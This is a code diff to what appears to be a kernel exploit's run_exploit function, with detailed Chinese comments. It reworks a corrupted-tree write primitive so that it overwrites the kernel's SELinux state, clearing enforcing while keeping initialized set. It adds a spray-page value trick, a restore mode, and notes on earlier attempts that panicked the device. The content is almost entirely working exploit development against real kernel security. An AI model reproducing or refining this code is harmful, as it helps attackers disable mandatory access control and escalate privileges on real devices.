@@ -891,27 +891,82 @@ int run_exploit(int argc, char **argv) {
            *   - 清零窗 +0..+7 无指针(avc@+0x48, xref 仅物化 +0/+2/+7) → 无 NULL deref;
            *   - initialized=0 时 compute_av/may_create/exec 全走早期放行 → 非内核拒绝挂死。
            * 结论: 杀手在用户态(framework 对 enforce=0/状态不一致的反应)。
-           * E5v2: 写值不再是全零 — PSELECT_SELINUX_ENF_VALUE (hex, 默认 0x10000):
-           *   +0 enforcing=0, +1 checkreqprot=0, +2 initialized=1(★保留★),
-           *   +3..+7 policycap[0..4]=0(特性关闭, 良性)。
-           *   → policy 保持"已加载", 决策走正常 compute_av + avc_denied permissive
-           *   分支 = allow + audit; framework 一致性最大保留。
-           * E5R(恢复轮): 同几何, VALUE=0x10001 → enforcing=1 立即还原,
-           *   把 permissive 暴露窗口压到分钟级(R 先行→E5→C+KO→E5R 背靠背)。 */
+           * ── mt76 (E5v2) 已废 ★★: VALUE=0x10000/0x10001 形态非法 —
+           *   非零值放进 TREE_RIGHT(word1=child) → CASE_A 额外执行
+           *   STORE(b) *(child)=pc → 写未映射地址 0x10000 → 同步异常 →
+           *   panic → 整机重启(2026-09-05 现场实证, 输出全 NUL)。
+           *   E5v2/E5R 从未真正检验过"保 initialized"语义。历史保留如下:
+           * E5v2(废): VALUE(hex, 默认 0x10000): +0 enforcing=0,
+           *   +1 checkreqprot=0, +2 initialized=1 — 形态非法, 见 mt78 块。
+           * ── mt78 (E5v3, 2026-09-05) ──
+           * ★写值合法形态(rb_erase 反汇编核实): 0(单 store)或「可写牺牲
+           *   指针」(双 store, 附带污染该指针+0 处 8 字节)。小常数一律 panic。★
+           * 巧解: child=fake_lock(喷页零区页对齐地址), 其地址字节即目标布局:
+           *   byte0=0x00(页对齐) → enforcing=0
+           *   byte2=(addr>>16)&0xff ≠0 → initialized=1(★保留, 运行时校验★)
+           *   byte1=checkreqprot≠0(按请求 prot 检查, 窗口期内无害)
+           *   byte3..7=policycap 随机位(多数特性未用, 低风险)
+           *   STORE(b) *(fake_lock)=pc → 污染牺牲喷页零区 ✓
+           * E5R(还原): VALUE=SPRAY1 → child=fake_lock+1 → byte0=1 →
+           *   enforcing=1, byte2 不变(无进位)。与 R 几何(7/7 无事故)同构。
+           * VALUE 语义重定义: "SPRAY"(默认)=fake_lock; "SPRAY1"=fake_lock+1;
+           *   "0"=E5v1 全零写(单 store, 已知黑屏风险, 仅受控对照);
+           *   其它数字一律 ABORT 并打原因(防再犯 §5.1)。 */
           uintptr_t enf_alias = P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + SELINUX_STATE_OFF);
-          uint64_t mt76_val = 0x10000ULL;
-          char *mt76_vs = getenv("PSELECT_SELINUX_ENF_VALUE");
-          if (mt76_vs && *mt76_vs)
-            mt76_val = strtoull(mt76_vs, NULL, 0);
+          uint64_t mt78_child;
+          const char *mt78_mode = getenv("PSELECT_SELINUX_ENF_VALUE");
+          if (!mt78_mode || !*mt78_mode || !strcmp(mt78_mode, "SPRAY")) {
+            mt78_mode = "SPRAY";
+            if (!fake_lock) {
+              pr_error("mt78: E5v3 %s but no spray page (fake_lock=0) - ABORT\n",
+                       mt78_mode);
+              fflush(stdout);
+              break;
+            }
+            mt78_child = (uint64_t)(size_t)fake_lock;
+          } else if (!strcmp(mt78_mode, "SPRAY1")) {
+            if (!fake_lock) {
+              pr_error("mt78: E5v3 SPRAY1 but no spray page (fake_lock=0) - ABORT\n");
+              fflush(stdout);
+              break;
+            }
+            mt78_child = (uint64_t)(size_t)fake_lock + 1;
+          } else if (!strcmp(mt78_mode, "0")) {
+            mt78_child = 0; /* E5v1 全零写: 单 store, 已知黑屏风险, 仅受控对照 */
+          } else {
+            pr_error("mt78: E5v3 VALUE='%s' 非法(仅 0/SPRAY/SPRAY1) — 非零常数"
+                     "会被当 child 解引用(STORE(b) *(child)=pc) → panic, "
+                     "E5v2 §5.1 同款. ABORT\n", mt78_mode);
+            fflush(stdout);
+            break;
+          }
+          uint8_t mt78_b0 = mt78_child & 0xff;
+          uint8_t mt78_b1 = (mt78_child >> 8) & 0xff;
+          uint8_t mt78_b2 = (mt78_child >> 16) & 0xff;
+          if (mt78_child) {
+            if ((mt78_mode[0] == 'S') && (mt78_b0 != 0) && (mt78_b0 != 1)) {
+              pr_error("mt78: E5v3 child=%llx byte0=%02x 既非0(enforce=0)也非1"
+                       "(还原) — 喷页未对齐? ABORT\n",
+                       (unsigned long long)mt78_child, mt78_b0);
+              fflush(stdout);
+              break;
+            }
+            if (mt78_b2 == 0) {
+              pr_error("mt78: E5v3 child=%llx byte2(initialized)=0 — 违反"
+                       "保留 initialized 语义(=v1 连带嫌疑形态). ABORT\n",
+                       (unsigned long long)mt78_child);
+              fflush(stdout);
+              break;
+            }
+          }
           snprintf(pc_env, sizeof(pc_env), "%zx",
                    (size_t)((enf_alias - 8) & ~3ULL));
-          snprintf(right_env, sizeof(right_env), "%zx", (size_t)mt76_val);
+          snprintf(right_env, sizeof(right_env), "%zx", (size_t)mt78_child);
           snprintf(left_env, sizeof(left_env), "0");
-          pr_info("mt74/76: SELINUX_ENF write pc=%s value=%llx "
-                  "(enforcing=%llx initialized@+2=%llx — E5v2 保留 initialized)\n",
-                  pc_env, (unsigned long long)mt76_val,
-                  (unsigned long long)(mt76_val & 0xff),
-                  (unsigned long long)((mt76_val >> 16) & 0xff));
+          pr_info("mt78: E5v3 SELINUX_ENF pc=%s child=%llx mode=%s "
+                  "(enforcing=%02x checkreqprot=%02x initialized@+2=%02x)\n",
+                  pc_env, (unsigned long long)mt78_child, mt78_mode,
+                  mt78_b0, mt78_b1, mt78_b2);
           fflush(stdout);
         } else if (getenv("PSELECT_PTR_PI")) {
           /* mt72 (E4): pi_tree_entry 继承色写 — 绕开 C 几何悖论。
